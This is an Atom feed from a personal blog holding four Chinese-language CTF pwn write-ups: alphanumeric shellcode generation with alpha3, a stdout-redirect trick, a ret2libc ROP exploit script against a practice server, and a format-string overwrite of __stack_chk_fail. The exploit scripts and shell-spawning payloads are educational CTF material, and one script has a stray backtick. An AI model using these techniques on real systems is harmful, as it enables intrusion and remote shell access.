<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C7</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-14T16:28:42.697Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>C7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于纯字符shellcode的编写</title>
    <link href="http://yoursite.com/2020/04/14/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2020/04/14/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</id>
    <published>2020-04-14T15:32:55.317Z</published>
    <updated>2020-04-14T16:28:42.697Z</updated>
    
    <content type="html"><![CDATA[<p>在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。<strong>在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！</strong>具体参考TaQini师傅的文章</p><p><a href='http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode' target="_blank" rel="noopener">纯字符shellcode生成指南</a></p><p>关键部分:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; len) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span> (((((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'a'</span>) || (<span class="string">'z'</span> &lt; (<span class="keyword">char</span>)buf[i])) &amp;&amp;</span><br><span class="line">          (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'A'</span> || (<span class="string">'Z'</span> &lt; (<span class="keyword">char</span>)buf[i])))) &amp;&amp;</span><br><span class="line">         (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">'0'</span> || (<span class="string">'Z'</span> &lt; (<span class="keyword">char</span>)buf[i])))) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I Can\'t Read This!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">buf();     <span class="comment">//可以看到程序会将我们的输入当成函数执行</span></span><br></pre></td></tr></table></figure><p>我们可以使用alpha3来将pwntools生成shellcode来转为alphanumeric shellcode.</p><p><code>1.python ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</code></p><p>在使用这条命令前我们还需要有pwntools生成的shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename  sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> str(shellcode)</span><br></pre></td></tr></table></figure><p>如何将文件的输出输出到sc文件中(不能输出到终端复制过去,有不可见字符)</p><p><code>2.python sc.py &gt; sc</code></p><p>然后我们就可以用1命令生成alphanumeric shellcode(这里的shellcode是会输出的终端,如果你想输出到文件中的话可以去翻官方文档)        ——-&gt;         <a href='https://github.com/SkyLined/alpha3 ' target="_blank" rel="noopener">alpha3</a></p><p><img src="/" alt="QQ图片20200415000820.png" class="lazyload" data-src="https://i.loli.net/2020/04/15/Wi9Jhe4L1NdfDwq.png"></p><p>   Note:这里要还有要注意一个寄存器的问题,因为这里buf函数是<code>call rax</code>所以我们的1命令中使用<code>rax</code>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。&lt;strong&gt;在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！&lt;/strong&gt;具体参考TaQini师傅的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[WUSTCTF]closed</title>
    <link href="http://yoursite.com/2020/04/14/[WUSTCTF]closed/"/>
    <id>http://yoursite.com/2020/04/14/[WUSTCTF]closed/</id>
    <published>2020-04-14T03:24:58.363Z</published>
    <updated>2020-04-14T16:17:34.955Z</updated>
    
    <content type="html"><![CDATA[<p>标准输出流全关了，需要将<code>stdout</code>重定向到<code>stdin</code>就行了。</p><p><code>cat flag &gt;&amp;0</code> 或 <code>exec 1&gt;&amp;0</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标准输出流全关了，需要将&lt;code&gt;stdout&lt;/code&gt;重定向到&lt;code&gt;stdin&lt;/code&gt;就行了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat flag &amp;gt;&amp;amp;0&lt;/code&gt; 或 &lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[HarekazeCTF2019]baby_rop2</title>
    <link href="http://yoursite.com/2020/04/05/[HarekazeCTF2019]baby_rop2/"/>
    <id>http://yoursite.com/2020/04/05/[HarekazeCTF2019]baby_rop2/</id>
    <published>2020-04-05T09:30:46.507Z</published>
    <updated>2020-04-05T09:45:15.087Z</updated>
    
    <content type="html"><![CDATA[<p>ida,checksec,F5三连。</p><p><img src="/" alt="QQ图片20200405170524.png" class="lazyload" data-src="https://i.loli.net/2020/04/05/5apPnyXTNwvJV3C.png"></p><img src="/" alt="QQ图片20200405165940.png" style="zoom: 50%;" / class="lazyload" data-src="https://i.loli.net/2020/04/05/bjnJQi1MAlfkHgu.png"><img src="/" alt="QQ图片20200405170003.png" style="zoom: 67%;" / class="lazyload" data-src="https://i.loli.net/2020/04/05/F8Hd9licxIUzNsp.png"><p>很简单的ROP，利用printf函数泄露出地址就行。</p><p>但是这道题一开始我没做出来是因为我忘了<strong>printf函数泄露地址里面是要有%s参数的</strong>。(可能是puts的题目做习惯了)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./babyrop2')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28010</span>)</span><br><span class="line">elf = ELF(<span class="string">'babyrop2'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span></span><br><span class="line">ret_addr = <span class="number">0x400734</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0x123</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'read'</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>Note:这里用有个r15是因为用ROPgadget查看发现gadget是这样的：</p><p><img src="/" alt="QQ图片20200405170950.png" class="lazyload" data-src="https://i.loli.net/2020/04/05/2MaTJgPRySKrm5Y.png"></p><p>所以这里的r15不用管，随便填就行了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ida,checksec,F5三连。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; alt=&quot;QQ图片20200405170524.png&quot; class=&quot;lazyload&quot; data-src=&quot;https://i.loli.net/2020/04/05/5apPnyXTNwvJ
      
    
    </summary>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/categories/BUUOJ/"/>
    
    
  </entry>
  
  <entry>
    <title>[BJD2nd]r2t4</title>
    <link href="http://yoursite.com/2020/03/23/[BJD2nd]r2t4/"/>
    <id>http://yoursite.com/2020/03/23/[BJD2nd]r2t4/</id>
    <published>2020-03-23T12:49:53.321Z</published>
    <updated>2020-03-30T00:16:34.760Z</updated>
    
    <content type="html"><![CDATA[<p>第一步当然就是日常查保护啦！</p><p>会看到堆栈不可执行还有NX保护</p><p><img src="/" alt="image-20200323213631230.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png"></p><p>然后就丢进IDA，F5</p><p><img src="/" alt="image-20200323214009122.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/N7gIPZSzXCDVjsv.png"></p><p><img src="/" alt="image-20200323214325901.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/8djRsrFqJOf93mx.png"></p><p>很明显的格式化字符串，发现出题人还留了后门函数，但是这个backdoor这个英语给我整笑了。这里一开始的思路是利用栈溢出泄露canary出来后然后填在ebp-8的位置上绕过栈保护，再控制程序流程去执行后门函数。想了半天也不知道为什么，调试程序的时候发现他只有一次输入一次输入，就是说泄露的canary之后没法再把payload输进去，想了半天都不知道怎么办，甚至还一度的怀疑是出题人出错了。</p><p>后来想到了这里并不能通过格式化泄露canary来绕过栈保护，而是进入任意地址写，将后门函数写进返回地址里面，又做了好久依旧没有打通，后来经过1p0ch师傅的指点，这里应该要将后门函数写到stack_chk_fail里面。我们知道当canary被修改了之后，会触发stack_chk_fail函数，所以可以利用这一点。(不过这种操作也是第一次听说，学到了)。</p><p>接下来先看下偏移是多少</p><p><img src="/" alt="image-20200323220148164.png" class="lazyload" data-src="https://i.loli.net/2020/03/24/aJWXOuUT9jMkFlg.png"></p><p>很明显看到偏移是6</p><p>那么我们接下来就可以写exp了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./r2t4'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">stack_addr=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%1574c%8$hnaaaaa'</span>+p64(`stack_addr)+<span class="string">'a'</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#1574是0x626是十进制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里偏移为8是因为'%1574c%8'为偏移6，'$hnaaaaa'为偏移7，那么要写入的p64(stack_addr)就是偏移8了。后面的aaaaa是为了对齐地址。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里为了触发__stack_chk_fail，payload的长度就要是0x30,也就是48.</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;第一步当然就是日常查保护啦！&lt;/p&gt;
&lt;p&gt;会看到堆栈不可执行还有NX保护&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; alt=&quot;image-20200323213631230.png&quot; class=&quot;lazyload&quot; data-src=&quot;https://i.loli.net
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
